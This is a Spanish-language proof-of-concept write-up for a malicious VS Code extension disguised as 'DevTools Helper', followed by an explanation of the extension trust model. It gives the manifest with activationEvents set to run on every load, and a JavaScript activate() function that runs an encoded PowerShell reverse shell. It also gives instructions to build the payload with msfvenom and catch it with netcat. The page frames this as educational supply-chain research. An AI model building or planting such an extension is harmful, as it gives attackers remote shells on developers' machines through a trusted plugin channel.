Evil VSIX extension

📅 16 Jun 2026 ·
WindowsReverse ShellExtension

Evil VSIX Extension es una extensión VSIX desarrollada como prueba de concepto para evaluar riesgos de seguridad en entornos de desarrollo. Demuestra técnicas de ejecución de código mediante extensiones de VS Code y permite analizar vectores de ataque relacionados con la cadena de suministro de software y la confianza en complementos de terceros.

Creacion

Se crea la siguiente estructura de proyecto 

.
├── [Content_Types].xml
└── extension/
    ├── extension.js
    └── package.js

En el archivo extension/package.js 

{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}

Asegurate de tener la version correcta en el parametro version y de que activationEvents este seteado como ["*"] asi ejecutara todo lo del codigo

El el archivo extension/extension.js 

const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e <BASE64_REVERSE_SHELL>');
}
exports.deactivate = function() {}

Para generar el Payload puedes usar uso de la herramienta msfvenom solo asegurate de encodear el parametro en base64

Uso

Ponerse en escucha con netcat

Basta con ejecutarlo en el sistema con VSCode

Cómo funciona

Una extensión VSIX es un paquete utilizado por Visual Studio Code para distribuir funcionalidades adicionales. Cuando una extensión es instalada, VS Code interpreta su archivo de configuración y carga el código JavaScript asociado a la extensión.

Este comportamiento es legítimo y forma parte del funcionamiento normal del editor. Sin embargo, una extensión maliciosa puede aprovechar el modelo de confianza de VS Code para ejecutar código arbitrario en el sistema de la víctima.

En este proyecto se demuestra cómo una extensión aparentemente inofensiva puede utilizar eventos de activación automáticos para ejecutar código tan pronto como VS Code la cargue.

Debido a que las extensiones se ejecutan con los permisos del usuario actual, estas pueden interactuar con el sistema operativo, acceder a archivos locales, realizar conexiones de red o ejecutar procesos externos.

Este tipo de técnica suele clasificarse como un ataque de cadena de suministro (Supply Chain Attack), ya que el usuario confía en una extensión aparentemente legítima que termina ejecutando acciones no autorizadas.

La prueba de concepto presentada tiene fines educativos y de investigación, permitiendo comprender los riesgos asociados a la instalación de extensiones de terceros en entornos de desarrollo.

El flujo de ejecución es el siguiente:

  1. El usuario instala la extensión .vsix en Visual Studio Code.
  2. VS Code lee el archivo package.json para identificar el punto de entrada de la extensión.
  3. Los eventos definidos en activationEvents determinan cuándo debe cargarse la extensión.
  4. Al cumplirse la condición de activación, VS Code ejecuta el archivo extension.js.
  5. La función activate() se ejecuta automáticamente con los permisos del usuario actual.
  6. El código de la extensión puede interactuar con recursos locales y realizar acciones definidas por el desarrollador.
  7. La ejecución ocurre dentro de un contexto considerado confiable por el usuario y por el propio editor.
